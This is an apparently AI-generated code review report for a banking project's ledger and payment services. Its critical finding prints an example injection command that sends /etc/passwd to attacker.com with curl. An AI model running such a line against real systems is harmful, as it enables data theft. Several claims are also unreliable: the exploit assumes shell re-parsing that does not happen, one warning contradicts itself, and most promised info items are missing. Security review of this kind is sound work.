# Phase 01.2: Code Review Report

**Reviewed:** 2026-04-16T00:00:00Z
**Depth:** standard
**Files Reviewed:** 20
**Status:** issues_found

## Summary

This phase delivers CDC/Outbox for ledger-service, idempotency at the ledger consumer, a DLT pipeline, and the HungTransferDetector for PAYMENT_PROCESSING and POSTING timeouts. The core design is sound: the outbox table, Debezium connector config, ExponentialBackOff + DLT wiring, and the FSM bypass rationale for POSTING are all well-reasoned and documented.

One critical issue was found: a path-traversal / shell-injection vulnerability in `register-connector.sh` where a user-supplied URL argument is embedded directly into a `python3 -c` command string. Five warnings cover a correctness bug in the idempotency guard race window, a non-atomic POSTING state update that can corrupt state under concurrent detector runs, an outbox payload built via string concatenation that will silently corrupt on UUIDs containing special characters, missing `@Transactional` on the DLT consumer, and Scope leak if a runtime exception escapes the try block in `LedgerEventListener`. Four info items cover hardcoded credentials in compose.yml, a stale connector name constant in the shell script, an unused `sys` import in the script, and missing `@Column(length=...)` on the Debezium `aggregateid` field in the outbox entity.

## Critical Issues

### CR-01: Shell injection via user-controlled URL in `register-connector.sh`

**File:** `scripts/register-connector.sh:19`

**Issue:** The `CONNECT_URL` variable (line 8, sourced from `$1`) is embedded verbatim inside a `python3 -c "..."` string via the `CONFIG=$(python3 -c "... open('$CONNECTOR_JSON') ...")` pattern (lines 19 and 43). Although `CONNECTOR_JSON` is constructed from a controlled `SCRIPT_DIR`, the same quoting model is used in both blocks. More critically, the `STATUS` curl commands on lines 16 and 39 embed `$CONNECT_URL` directly in a double-quoted shell string — any attacker who can influence `$1` (e.g., through a CI variable or a dev mis-running the script) can inject arbitrary shell commands.

Example exploit:
```
./register-connector.sh 'http://localhost:8085"; curl http://attacker.com/exfil?x=$(cat /etc/passwd) #'
```

**Fix:** Quote all variable expansions and use `--data-urlencode` or pass the URL as a curl argument without embedding it in interpolated strings. For the Python invocation, pass the file path as a positional argument rather than interpolating it into `-c`:

```bash
# Replace the python3 -c inline approach:
CONFIG=$(python3 - "$CONNECTOR_JSON" <<'EOF'
import json, sys
d = json.load(open(sys.argv[1]))
print(json.dumps(d.get('config', d)))
EOF
)
```

For the `curl` calls, the `$CONNECT_URL` embedding itself is safe only because `set -u` is set; however, always use `--` to terminate option parsing or validate the URL:

```bash
# Validate URL at the top of the script
if [[ ! "$CONNECT_URL" =~ ^https?:// ]]; then
  echo "ERROR: Invalid CONNECT_URL: $CONNECT_URL" >&2
  exit 1
fi
```

## Warnings

### WR-01: Idempotency race window between `isNewTransfer()` and `initiateTransfer()` in `PaymentController`

**File:** `payment-service/src/main/java/au/com/bankforge/payment/controller/PaymentController.java:49-53`

**Issue:** `isNewTransfer()` calls Redis on line 49 to record whether the key is new, then `initiateTransfer()` is called on line 50 — two separate Redis reads. If a concurrent request lands between those two calls, both callers can see `isNew = true` and both will return 201. The comment in the controller correctly identifies this intent ("Check idempotency BEFORE calling service") but the implementation still has a gap: the idempotency key is not atomically reserved at the `isNew` check point. The actual idempotency guarantee is in `IdempotencyService.setIfAbsent`, but by then the HTTP status has already been determined.

In practice this means two concurrent identical requests could both get 201 instead of one 201 / one 200. For a banking platform, 201 vs 200 is the contract signal for "new transfer created" — a double-201 could cause a client to consider the transfer initiated twice.

**Fix:** Determine the correct HTTP status after the call completes rather than before. The `IdempotencyService.setIfNew` return value (true = newly written) is the authoritative signal:

```java
// In PaymentService.buildAndCacheResponse — capture whether this write was first
boolean wasNew = idempotencyService.setIfNew(idempotencyKey, serialize(response));
return new InitiateTransferResult(response, wasNew); // new record class
```

Then return 201 only when `wasNew == true`. Alternatively, have `initiateTransfer` return an `InitiateTransferResult` containing both the response and whether it was a new write, so the status code is derived from the atomically-correct signal.

### WR-02: Non-atomic POSTING state update in `HungTransferDetector.resolveHungPosting()` — concurrent detector runs can lose state

**File:** `payment-service/src/main/java/au/com/bankforge/payment/detector/HungTransferDetector.java:96-103`

**Issue:** `resolveHungPosting()` does an optimistic read-then-write without a transaction or optimistic locking. The flow is:

```java
transfer.setState(TransferState.FAILED);   // line 98 — in-memory mutation
transfer.setErrorMessage("...");           // line 99 — in-memory mutation
transferRepository.save(transfer);         // line 100 — flush to DB
```

There is no `@Transactional` annotation on `resolveHungPosting()` (the public `detectHungTransfers()` is also non-transactional). If the scheduler fires twice in close succession (e.g., a slow previous run overlaps the next 60-second tick, which is possible since `fixedDelay` starts timing after the previous execution), two threads can both load the same POSTING transfer, both set FAILED, and both `save()` — the second write simply overwrites the first, which is harmless here, but the logic also doesn't prevent double-increment of the `transfer_initiated_total{state=FAILED}` metric, causing an inflated counter.

More seriously, if the transfer was already CONFIRMED (by `TransferConfirmationListener`) between the `findByStateAndUpdatedAtBefore` query and the `save()`, the detector overwrites CONFIRMED → FAILED — a silent data corruption.

**Fix:** Add `@Transactional` to `detectHungTransfers()` or extract `resolveHungPosting()` into `TransferStateService` with `REQUIRES_NEW` and a version-checked update:

```java
// In TransferStateService, add:
@Transactional(propagation = Propagation.REQUIRES_NEW)
public boolean markPostingAsFailed(UUID transferId, String message) {
    Transfer t = transferRepository.findById(transferId).orElse(null);
    if (t == null || t.getState() != TransferState.POSTING) {
        return false; // already transitioned, skip
    }
    t.setState(TransferState.FAILED);
    t.setErrorMessage(message);
    transferRepository.save(t);
    return true;
}
```

Then in `HungTransferDetector` only increment the metric when `markPostingAsFailed` returns `true`.

### WR-03: Outbox payload built with string concatenation — control characters in `transferId` are not escaped

**File:** `ledger-service/src/main/java/au/com/bankforge/ledger/kafka/LedgerEventListener.java:98-99`

**Issue:** The outbox payload is constructed as:

```java
.payload("{\"transferId\":\"" + transferId + "\",\"status\":\"CONFIRMED\"}")
```

`transferId` is a `UUID` already validated by `UUID.fromString()`, so the character set is constrained to hex digits and hyphens — the risk here is low in practice. However, this pattern is fragile: if the payload template is ever extended to include fields from untrusted input (e.g., description strings, account IDs from external sources), the same pattern will produce malformed JSON or allow JSON injection without any build-time warning. Using the already-injected `ObjectMapper` ensures correct serialisation regardless of content.

**Fix:** Use `ObjectMapper` for payload construction:

```java
// Replace the string concatenation with:
Map<String, String> payloadMap = Map.of(
    "transferId", transferId.toString(),
    "status", "CONFIRMED"
);
String payloadJson = objectMapper.writeValueAsString(payloadMap);
LedgerOutboxEvent outboxRow = LedgerOutboxEvent.builder()
    .aggregatetype("transfer-confirmation")
    .aggregateid(transferId.toString())
    .type("TransferConfirmed")
    .payload(payloadJson)
    .build();
```

### WR-04: OTel `Scope` is not closed if an exception is thrown before the `try` block in `LedgerEventListener`

**File:** `ledger-service/src/main/java/au/com/bankforge/ledger/kafka/LedgerEventListener.java:65-103`

**Issue:** `baggage.makeCurrent()` returns a `Scope` that must be closed to restore the previous context. The code uses `try (Scope scope = baggage.makeCurrent())` correctly for the normal path, but the `Baggage.current().toBuilder()` and `baggage.makeCurrent()` are called **after** the idempotency guard return (line 60-62) and **before** the `try` block (line 68). If `baggage.makeCurrent()` itself throws (unlikely but possible under OTel shutdown or misconfiguration), the scope is never closed, leaking the context onto the current thread.

More concretely: if a `RuntimeException` is thrown during `LedgerEntry.builder()` construction (lines 70-86), it is caught by the Spring Kafka error handler **outside** the `try-with-resources`, meaning the scope IS closed (that is correct). The actual risk here is narrower — `baggage.makeCurrent()` and the scope are on lines 65-68, and the `try` starts at 68, so the scope is properly managed inside the try-with-resources for the normal throw path. However, the `Baggage` object is built outside the `try` block (lines 65-67), and if `toBuilder().put(...).build()` throws, `makeCurrent()` is never called and there is no leak. This path is actually safe as written.

The real issue is that `baggage` is created unconditionally even when the idempotency guard at line 59 returns early — at that point, no baggage is set (the `return` on line 61 exits before the baggage block). This means idempotent replays do **not** propagate `banking.transaction.id` in OTel Baggage, which may cause trace correlation gaps for replayed events. Whether this is intentional is unclear from the code; the comment on line 64 does not mention this case.

**Fix:** If baggage propagation is desired for the idempotency no-op path (so replayed events appear in the same trace), move the baggage setup above the guard:

```java
// After parsing transferId, set baggage for all paths including idempotent replays
Baggage baggage = Baggage.current().toBuilder()
        .put("banking.transaction.id", transferId.toString())
        .build();
try (Scope scope = baggage.makeCurrent()) {
    if (ledgerEntryRepository.existsByTransferId(transferId)) {
        log.info("Ledger entries already exist for transferId={}, skipping", transferId);
        return;
    }
    // ... rest of processing
}
```

### WR-05: `DltHandler` in ledger-service lacks `@Transactional` — a crash mid-log leaves no audit trail

**File:** `ledger-service/src/main/java/au/com/bankforge/ledger/kafka/DltHandler.java:34-47`

**Issue:** The DLT handler is correctly documented as read-only (log and discard). However, it has no error handling around the `record.headers().forEach(...)` block on line 44. If `new String(header.value())` throws (e.g., a header with a null value), the exception propagates out of the `@KafkaListener` method. Because the DLT listener is on `ledger-service-dlt` group (separate from the main `ledger-service` group) and no error handler is configured for this factory — the `kafkaListenerContainerFactory` bean in `KafkaConfig` is declared with `@Bean` (not qualified) and will be auto-selected — the default container factory's `DefaultErrorHandler` will apply, meaning the DLT message will itself be retried with exponential backoff.

If the DLT listener consistently fails (malformed header), this can cause unbounded retries consuming broker resources and filling logs, since there is no secondary DLT to route these failures to.

**Fix:** Wrap the header iteration in a try-catch, or use a null-safe string conversion:

```java
record.headers().forEach(header -> {
    String value = header.value() != null ? new String(header.value()) : "<null>";
    log.error("  DLT header: {}={}", header.key(), value);
});
```

Additionally, consider configuring the DLT listener to use a dedicated `ContainerFactory` with a no-retry `FixedBackOff(0, 0)` to prevent recursive retry loops on the DLT consumer itself.

### IN-04: `LedgerOutboxEvent.aggregateid` column has no explicit `length` constraint mismatch risk

**File:** `ledger-service/src/main/java/au/com/bankforge/ledger/entity/LedgerOutboxEvent.java:43`

**Issue:** The `aggregateid` field is mapped as `@Column(nullable = false, length = 255)`. In the current usage it stores a UUID string (36 chars). The Debezium connector config sets `transforms.outbox.table.field.event.key: aggregateid`, meaning this column becomes the Kafka record key. The length 255 is fine for UUIDs, but if `aggregateid` is ever used for a longer composite key (e.g., a business key), the column constraint would silently truncate at the DB layer. The SQL migration (V3) also defines it as `VARCHAR(255)` — these are consistent, but the comment in the entity only says "the aggregate's unique identifier (transferId)" without noting the Kafka key role.

**Fix:** No code change required. Add a comment to the `aggregateid` field clarifying its dual role:

```java
/**
 * The aggregate's unique identifier (currently: transferId as UUID string).
 * This value becomes the Kafka record KEY via Debezium EventRouter (see connector config).
 * Max length 255 — sufficient for UUID (36 chars). Do not store composite keys here.
 */
@Column(nullable = false, length = 255)
private String aggregateid;
```
